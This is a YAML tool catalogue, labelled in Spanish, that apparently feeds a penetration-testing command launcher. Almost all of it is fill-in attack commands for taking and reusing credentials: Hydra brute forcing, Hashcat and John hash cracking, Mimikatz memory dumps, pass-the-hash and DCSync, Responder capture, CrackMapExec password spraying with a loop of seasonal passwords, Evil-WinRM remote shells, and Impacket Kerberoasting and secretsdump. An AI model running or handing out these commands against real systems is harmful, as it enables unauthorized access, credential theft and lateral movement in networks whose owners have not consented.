tools:
  - name: "Hydra - SSH Brute Force"
    description: "Fuerza bruta SSH con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} ssh -t {threads}"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "root"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"
      - name: threads
        label: "Threads"
        type: text
        placeholder: "16"

  - name: "Hydra - HTTP POST Login"
    description: "Fuerza bruta formulario web POST con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} http-post-form \"{path}:{body}:{fail_str}\""
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "admin"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"
      - name: path
        label: "Path del formulario"
        type: text
        placeholder: "/login.php"
      - name: body
        label: "Body POST"
        type: text
        placeholder: "username=^USER^&password=^PASS^"
      - name: fail_str
        label: "String de fallo"
        type: text
        placeholder: "Invalid credentials"

  - name: "Hydra - RDP Brute Force"
    description: "Fuerza bruta RDP con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} rdp -t 4"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"

  - name: "Hydra - SMB Brute Force"
    description: "Fuerza bruta SMB con Hydra"
    command: "hydra -l {user} -P {wordlist} {target} smb"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"

  - name: "John the Ripper - Crackear hash"
    description: "Crackear fichero de hashes con John"
    command: "john {hashfile} --wordlist={wordlist} --format={format}"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "hashes.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
      - name: format
        label: "Formato hash"
        type: text
        placeholder: "NT"

  - name: "John - Mostrar credenciales crackeadas"
    description: "Ver hashes ya crackeados por John"
    command: "john {hashfile} --show"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "hashes.txt"

  - name: "Hashcat - NTLM Wordlist"
    description: "Crackear hashes NTLM con hashcat y wordlist"
    command: "hashcat -m 1000 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "ntlm.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - NTLM + Rules"
    description: "Crackear NTLM con reglas de mutacion"
    command: "hashcat -m 1000 -a 0 {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "ntlm.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - NetNTLMv2"
    description: "Crackear capturas NetNTLMv2 (Responder)"
    command: "hashcat -m 5600 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero NetNTLMv2"
        type: text
        placeholder: "netntlmv2.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - Kerberoast (TGS)"
    description: "Crackear tickets TGS de Kerberoasting"
    command: "hashcat -m 13100 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero tickets TGS"
        type: text
        placeholder: "tgs_hashes.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Hashcat - AS-REP Roast"
    description: "Crackear hashes AS-REP (Kerberos pre-auth disabled)"
    command: "hashcat -m 18200 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero AS-REP"
        type: text
        placeholder: "asrep.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"

  - name: "Crunch - Generar wordlist custom"
    description: "Generar wordlist con patron especifico"
    command: "crunch {min} {max} {charset} -t {pattern} -o {output}"
    params:
      - name: min
        label: "Longitud minima"
        type: text
        placeholder: "8"
      - name: max
        label: "Longitud maxima"
        type: text
        placeholder: "12"
      - name: charset
        label: "Charset"
        type: text
        placeholder: "abcdefghijklmnopqrstuvwxyz0123456789"
      - name: pattern
        label: "Patron (@ = min, , = may, % = num, ^ = especial)"
        type: text
        placeholder: "Company@@@@"
      - name: output
        label: "Fichero salida"
        type: text
        placeholder: "custom.txt"

  - name: "CeWL - Wordlist desde web"
    description: "Generar wordlist a partir del contenido de una web"
    command: "cewl {url} -m {minlen} -w {output} --with-numbers"
    params:
      - name: url
        label: "URL objetivo"
        type: text
        placeholder: "http://192.168.1.10"
      - name: minlen
        label: "Longitud minima"
        type: text
        placeholder: "6"
      - name: output
        label: "Fichero salida"
        type: text
        placeholder: "cewl_words.txt"

  - name: "Mimikatz - Dump credenciales (sekurlsa)"
    description: "Volcar credenciales en memoria con Mimikatz"
    command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
    params: []

  - name: "Mimikatz - Pass the Hash"
    description: "Autenticar con hash NTLM via Mimikatz"
    command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash} /run:cmd.exe\" exit"
    params:
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: domain
        label: "Dominio"
        type: text
        placeholder: "CORP"
      - name: hash
        label: "Hash NTLM"
        type: text
        placeholder: "aad3b435b51404eeaad3b435b51404ee"

  - name: "Mimikatz - lsadump SAM"
    description: "Volcar hashes SAM con Mimikatz (requiere SYSTEM)"
    command: "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit"
    params: []

  - name: "Mimikatz - DCSync"
    description: "Replicar credenciales via DCSync"
    command: "mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:{user}\" exit"
    params:
      - name: domain
        label: "Dominio"
        type: text
        placeholder: "corp.local"
      - name: user
        label: "Usuario objetivo"
        type: text
        placeholder: "krbtgt"

  - name: "Responder - Capturar NetNTLMv2"
    description: "Capturar hashes NetNTLMv2 con Responder"
    command: "responder -I {iface} -rdwv"
    params:
      - name: iface
        label: "Interfaz de red"
        type: text
        placeholder: "eth0"

  - name: "Identificar tipo de hash"
    description: "Identificar formato de hash con hashid"
    command: "hashid {hash}"
    params:
      - name: hash
        label: "Hash a identificar"
        type: text
        placeholder: "5f4dcc3b5aa765d61d8327deb882cf99"

  - name: "Hashcat - SHA-512 Linux"
    description: "Crackear hashes SHA-512 de /etc/shadow"
    command: "hashcat -m 1800 -a 0 {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force"
    params:
      - name: hashfile
        label: "Fichero de hashes"
        type: text
        placeholder: "shadow_hashes.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
    tags: ["hashcat", "sha512", "linux"]

  - name: "Hashcat - bcrypt"
    description: "Crackear hashes bcrypt"
    command: "hashcat -m 3200 -a 0 {hashfile} {wordlist} --force"
    params:
      - name: hashfile
        label: "Fichero de hashes bcrypt"
        type: text
        placeholder: "bcrypt.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
    tags: ["hashcat", "bcrypt"]

  - name: "Hashcat - JWT Token"
    description: "Crackear secret de JWT token"
    command: "hashcat -a 0 -m 16500 {jwt_token} {wordlist} --force"
    params:
      - name: jwt_token
        label: "JWT token o fichero"
        type: text
        placeholder: "jwt.txt"
      - name: wordlist
        label: "Wordlist"
        type: text
        placeholder: "/usr/share/wordlists/rockyou.txt"
    tags: ["hashcat", "jwt"]

  - name: "CrackMapExec - Password Spray SMB"
    description: "Password spray contra SMB con lista de usuarios/passwords"
    command: "crackmapexec smb {target} -u {userlist} -p {passlist} --no-bruteforce --continue-on-success 2>/dev/null"
    params:
      - name: target
        label: "Target IP/Subnet"
        type: text
        placeholder: "192.168.1.0/24"
      - name: userlist
        label: "Lista de usuarios"
        type: text
        placeholder: "/tmp/users.txt"
      - name: passlist
        label: "Lista de contraseñas"
        type: text
        placeholder: "/tmp/passwords.txt"
    tags: ["crackmapexec", "password-spray", "smb"]

  - name: "CrackMapExec - Pass the Hash SMB"
    description: "Autenticar via Pass-the-Hash en SMB"
    command: "crackmapexec smb {target} -u {user} -H {ntlm_hash} --shares 2>/dev/null"
    params:
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: ntlm_hash
        label: "Hash NTLM"
        type: text
        placeholder: "aad3b435b51404eeaad3b435b51404ee"
    tags: ["crackmapexec", "pass-the-hash", "smb"]

  - name: "Evil-WinRM - Shell con contraseña"
    description: "Shell remota via WinRM con credenciales"
    command: "evil-winrm -i {target} -u {user} -p {password}"
    params:
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: password
        label: "Contraseña"
        type: text
        placeholder: "P@ssw0rd"
    tags: ["evil-winrm", "winrm", "shell"]

  - name: "Evil-WinRM - Shell con hash NTLM"
    description: "Shell remota via WinRM con hash NTLM (Pass-the-Hash)"
    command: "evil-winrm -i {target} -u {user} -H {ntlm_hash}"
    params:
      - name: target
        label: "Target IP"
        type: text
        placeholder: "192.168.1.10"
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: ntlm_hash
        label: "Hash NTLM"
        type: text
        placeholder: "aad3b435b51404eeaad3b435b51404ee"
    tags: ["evil-winrm", "pass-the-hash", "winrm"]

  - name: "Impacket - secretsdump (credenciales)"
    description: "Volcar hashes NTLM con secretsdump"
    command: "impacket-secretsdump {domain}/{user}:{password}@{target} 2>/dev/null"
    params:
      - name: target
        label: "Target IP (DC)"
        type: text
        placeholder: "192.168.1.10"
      - name: domain
        label: "Dominio"
        type: text
        placeholder: "CORP"
      - name: user
        label: "Usuario"
        type: text
        placeholder: "administrator"
      - name: password
        label: "Contraseña"
        type: text
        placeholder: "P@ssw0rd"
    tags: ["impacket", "secretsdump", "ntlm"]

  - name: "Impacket - Kerberoasting"
    description: "Obtener tickets TGS de cuentas de servicio para crackear offline"
    command: "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dcip} -request 2>/dev/null | grep '\\$krb5tgs'"
    params:
      - name: domain
        label: "Dominio"
        type: text
        placeholder: "CORP.local"
      - name: user
        label: "Usuario"
        type: text
        placeholder: "user1"
      - name: password
        label: "Contraseña"
        type: text
        placeholder: "P@ssw0rd"
      - name: dcip
        label: "IP del DC"
        type: text
        placeholder: "192.168.1.10"
    tags: ["impacket", "kerberoasting", "active-directory"]

  - name: "Impacket - AS-REP Roasting"
    description: "Obtener AS-REP hashes de cuentas sin Kerberos pre-autenticación"
    command: "impacket-GetNPUsers {domain}/ -no-pass -usersfile {userlist} -dc-ip {dcip} -format hashcat 2>/dev/null | grep '\\$krb5asrep'"
    params:
      - name: domain
        label: "Dominio"
        type: text
        placeholder: "CORP.local"
      - name: userlist
        label: "Lista de usuarios"
        type: text
        placeholder: "/tmp/users.txt"
      - name: dcip
        label: "IP del DC"
        type: text
        placeholder: "192.168.1.10"
    tags: ["impacket", "asrep-roasting", "active-directory"]

  - name: "Spray de contraseñas estacionales"
    description: "Spray con contraseñas estacionales comunes (meses, años, empresa)"
    command: "for pass in 'Summer2024!' 'Winter2024!' 'Spring2024!' 'Autumn2024!' 'Company2024!' 'Welcome1!' 'Password1!' 'P@ssw0rd' 'Admin2024!'; do crackmapexec smb {target} -u {userlist} -p \"$pass\" --no-bruteforce 2>/dev/null | grep '\\[+\\]' && break; done"
    params:
      - name: target
        label: "Target IP/Subnet"
        type: text
        placeholder: "192.168.1.0/24"
      - name: userlist
        label: "Lista de usuarios"
        type: text
        placeholder: "/tmp/ad_users.txt"
    tags: ["password-spray", "seasonal", "smb"]
